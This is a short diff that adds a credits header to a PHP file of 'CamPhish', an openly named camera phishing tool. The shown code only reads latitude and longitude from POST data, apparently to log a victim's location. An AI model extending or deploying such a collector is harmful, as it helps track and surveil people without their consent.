@@ -1,4 +1,13 @@
 <?php
+/**
+ * CamPhish - Advanced Camera Phishing Tool
+ * 
+ * @author     Rahul Kushwaha
+ * @github     https://github.com/raahulllkushwaha
+ * @repository https://github.com/raahulllkushwaha/Cam-Phisher
+ * @license    GNU General Public License v3.0
+ */
+
 $date = date('dMYHis');
 $latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
 $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
